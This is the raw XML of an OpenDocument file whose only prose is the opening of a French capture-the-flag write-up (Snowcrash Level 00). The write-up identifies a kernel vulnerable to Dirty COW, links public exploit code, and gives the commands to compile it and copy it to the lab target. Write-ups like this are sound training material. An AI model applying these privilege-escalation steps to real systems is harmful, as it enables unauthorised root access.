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10D000016899161255C.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700001E64000007C17C337FAF.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700004BDD00000B457415A45E.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000390E000013201CB83C11.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700003482000016893D6F24B1.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700001CA200000F4DBD099AB6.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000395D00000B108D7E6B03.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700005CB60000166EEC8B04C8.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700005D06000028BA6F0E6010.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700002F2200001193FAE12CB2.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000021980000251C09165BE7.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000313300001F6C552E520B.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000318300000D3C1EBA9483.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700002BB9000010F48F58FCD0.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700003556000003D464E437FD.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000047F0000013F363BCAB6A.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700005E7800001A5C1C0EA467.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000379C000007A7A1BD4F27.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000214900000F82B0118161.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700004C97000009EDC165327B.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000039C7000011290C7A8DFC.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700001DDF0000069EC0358C65.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700001CA2000003EE387439E8.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700002712000007725C6F316E.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700004099000003EEA8B09DEC.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700007234000035F4ED141EE4.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000038A4000007C12C86188E.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700005EC7000022BB862B4B01.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700005A21000018658D89DAC8.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000506A00000BFE0D72419F.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700007E33000007C1E257B8C2.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000365E0000094E1D85C6B8.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700003F42000009D3B55C830A.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000237400000BAFAD19511B.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700003BF300001830C2D88949.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700003805000010A554295403.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000038D9000010F44CE355D3.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700002BB900000A8C25E22220.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000034EC00000B5F84DFB538.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700003E6E00001B15B67031B0.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700001D90000006354FB75889.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700002C580000110F5E711277.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000485A0000099EFD1857F8.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000690300001193A08A1542.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000316800000C82CF76E16F.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000313300001D0C571E5D48.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000023F90000061A43636B81.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000390E000021B21BE4C3D5.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700004526000013552DDDB221.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000272D000007F691A8C83D.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700004A1C0000115E8EA03B5D.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700004241000027976F2F3670.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700005894000013F31CD1A76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7" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties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style:font-name="Courier New" fo:font-size="11pt" style:font-size-asian="11pt" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Standard">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13" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:color="#006600" fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:color="#006600" fo:font-style="normal" fo:font-weight="bold" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:padding="0.074cm" fo:border-left="none" fo:border-right="none" fo:border-top="none" fo:border-bottom="0.002cm solid #000000" style:join-border="false"/>
      <style:text-properties fo:font-style="normal" fo:font-weight="normal" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:padding="0.074cm" fo:border-left="none" fo:border-right="none" fo:border-top="none" fo:border-bottom="0.002cm solid #000000" style:join-border="false"/>
      <style:text-properties fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:padding="0.074cm" fo:border-left="none" fo:border-right="none" fo:border-top="none" fo:border-bottom="0.002cm solid #000000" style:join-border="false"/>
      <style:text-properties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margin-top="0cm" fo:margin-bottom="0cm" fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="normal" fo:font-weight="normal" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" fo:text-align="justify" style:justify-single-word="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top="0cm" fo:margin-bottom="0cm" fo:text-align="justify" style:justify-single-word="false"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P22" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P23" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" fo:text-align="justify" style:justify-single-word="false" fo:padding="0.074cm" fo:border-left="none" fo:border-right="none" fo:border-top="none" fo:border-bottom="0.002cm solid #000000" style:join-border="false"/>
    </style:style>
    <style:style style:name="P24" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" fo:text-align="justify" style:justify-single-word="false"/>
    </style:style>
    <style:style style:name="P25" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P26" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
    </style:style>
    <style:style style:name="P27" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#cd2828" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="P28" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" fo:line-height="125%" fo:text-align="justify" style:justify-single-word="false" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#cd2828" fo:font-weight="bold" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P29" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#fb660a" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="P30" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#d0d0d0"/>
    </style:style>
    <style:style style:name="P31" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#999999" fo:font-style="italic" fo:font-weight="normal" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P32" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#999999" fo:font-style="italic"/>
    </style:style>
    <style:style style:name="P33" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
    </style:style>
    <style:style style:name="P34" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#d0d0d0"/>
    </style:style>
    <style:style style:name="P35" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#d0d0d0" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P36" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:text-align="justify" style:justify-single-word="false" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#d0d0d0" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P37" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#cd2828" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="P38" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P39" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:text-align="justify" style:justify-single-word="false" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P40" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#6ab825" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="P41" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#008800" fo:font-style="italic" fo:background-color="#0f140f"/>
    </style:style>
    <style:style style:name="P42" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#008800" fo:font-style="italic" fo:background-color="#0f140f"/>
    </style:style>
    <style:style style:name="P43" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#008800" fo:font-style="italic" fo:font-weight="normal" fo:background-color="#0f140f" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P44" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#ff0007" fo:font-style="italic" fo:font-weight="bold" fo:background-color="#0f140f" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P45" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#fb660a" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="P46" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#ffffff"/>
    </style:style>
    <style:style style:name="P47" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L1">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="italic" fo:font-weight="normal" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P48" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L2">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="italic" fo:font-weight="normal" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P49" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L3">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="italic" fo:font-weight="normal" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P50" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L4">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="italic" fo:font-weight="normal" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P51" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L5">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="italic" fo:font-weight="normal" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P52" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L6">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="italic" fo:font-weight="normal" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P53" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L7">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="italic" fo:font-weight="normal" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P54" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L8">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="italic" fo:font-weight="normal" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P55" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L11">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="italic" fo:font-weight="normal" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P56" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L12">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="italic" fo:font-weight="normal" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P57" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L13">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="italic" fo:font-weight="normal" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P58" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L14">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="italic" fo:font-weight="normal" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P59" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L17">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="italic" fo:font-weight="normal" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P60" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L18">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="italic" fo:font-weight="normal" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P61" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L19">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="italic" fo:font-weight="normal" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P62" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L20">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="italic" fo:font-weight="normal" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P63" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L9">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P64" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L10">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P65" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L15">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P66" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L16">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
    </style:style>
    <style:style style:name="P67" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:color="#006600"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bold"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style:font-name="Courier New"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" style:font-size-asian="11pt" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" fo:font-style="italic" style:font-size-asian="11pt" style:font-style-asian="italic" style:font-size-complex="11pt" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T13" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" fo:font-weight="normal" style:font-size-asian="11pt" style:font-weight-asian="normal" style:font-size-complex="11pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" style:text-underline-style="none" style:font-size-asian="11pt" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="T15" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" fo:font-style="normal" style:font-size-asian="11pt" style:font-style-asian="normal" style:font-size-complex="11pt" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T16"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17" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-style="normal" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T18" style:family="text">
      <style:text-properties fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T19" style:family="text">
      <style:text-properties fo:color="#6ab825" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="T20" style:family="text">
      <style:text-properties fo:color="#d0d0d0"/>
    </style:style>
    <style:style style:name="T21" style:family="text">
      <style:text-properties fo:color="#d0d0d0" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="T22" style:family="text">
      <style:text-properties fo:color="#ffa500"/>
    </style:style>
    <style:style style:name="T23" style:family="text">
      <style:text-properties fo:color="#ed9d13"/>
    </style:style>
    <style:style style:name="T24" style:family="text">
      <style:text-properties fo:color="#ed9d13" fo:font-size="9pt" style:font-size-asian="9pt" style:font-size-complex="9pt"/>
    </style:style>
    <style:style style:name="T25" style:family="text">
      <style:text-properties fo:color="#447fcf"/>
    </style:style>
    <style:style style:name="T26" style:family="text">
      <style:text-properties fo:color="#40ffff"/>
    </style:style>
    <style:style style:name="T27" style:family="text">
      <style:text-properties fo:color="#3677a9"/>
    </style:style>
    <style:style style:name="T28" style:family="text">
      <style:text-properties fo:color="#24909d"/>
    </style:style>
    <style:style style:name="T29" style:family="text">
      <style:text-properties style:font-name="Times New Roman" fo:font-size="12pt" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T30" style:family="text">
      <style:text-properties style:font-name="Times New Roman" fo:font-size="12pt" fo:font-weight="bold" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T31" style:family="text">
      <style:text-properties style:font-name="Times New Roman" fo:font-size="12pt" fo:font-style="italic" style:font-size-asian="12pt" style:font-style-asian="italic" style:font-size-complex="12pt" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T32"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33" style:family="text">
      <style:text-properties style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color"/>
    </style:style>
    <style:style style:name="T34" style:family="text">
      <style:text-properties fo:color="#fb660a"/>
    </style:style>
    <style:style style:name="T35" style:family="text">
      <style:text-properties fo:color="#fb660a" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="T36" style:family="text">
      <style:text-properties fo:color="#ffffff"/>
    </style:style>
    <style:style style:name="T37" style:family="text">
      <style:text-properties fo:color="#0086d2"/>
    </style:style>
    <style:style style:name="T38" style:family="text">
      <style:text-properties fo:color="#0086f7" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="T39" style:family="text">
      <style:text-properties fo:color="#ff0086"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2 PROJECT</text:p>
      <text:p text:style-name="P1">Snowcrash</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:list xml:id="list943159222942688723" text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P47">Level 00</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">On fait tourner un <text:span text:style-name="T5">linpeas.sh</text:span> pour commencer, car on ne trouve rien dans le dossier <text:span text:style-name="T5">home </text:span>de cet utilisateur. On note que la version de Linux utilisée a une architecture 32 bits, et est finalement assez ancienne :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr1" draw:name="images52" text:anchor-type="paragraph" svg:width="18.999cm" svg:height="4.411cm" draw:z-index="51"><draw:image xlink:href="Pictures/200000070000610D000016899161255C.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P4">Il s'agit d'une version vulnérable à <text:span text:style-name="T5">dirtycow</text:span> :</text:p>
      <text:p text:style-name="P4"><text:a xlink:type="simple" xlink:href="https://github.com/FireFart/dirtycow/blob/master/dirty.c" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://github.com/FireFart/dirtycow/blob/master/dirty.c</text:a> </text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Voir toutes les versions des PoCs :</text:p>
      <text:p text:style-name="P4"><text:a xlink:type="simple" xlink:href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs</text:a> </text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Quoi qu'il en soit, l'hôte est vulnérable à cet exploit. On télécharge le code source (premier lien), puis on le compile en 32 Bits (après avoir installé <text:span text:style-name="T11">gcc-multilib</text:span> donc) :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P7">gcc -m32 -static -pthread dirty.c -o dirty -lcrypt</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">REMARQUE : on le compile en statique, car en l'ayant compilé en dynamique j'ai eu des problèmes de compatibilité avec les librairies utilisées sur la cible (en particulier lcrypt). Ici, tout est dans le binaire.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">On transfert le fichier sur la cible avec un simple <text:span text:style-name="T5">scp</text:span> :</text:p>
      <text:p text:style-name="P7">scp -P 4242 dirty level00@192.168.1.16:/tmp/hehe</text:p>
      <text:p text:style-name="P4"/>
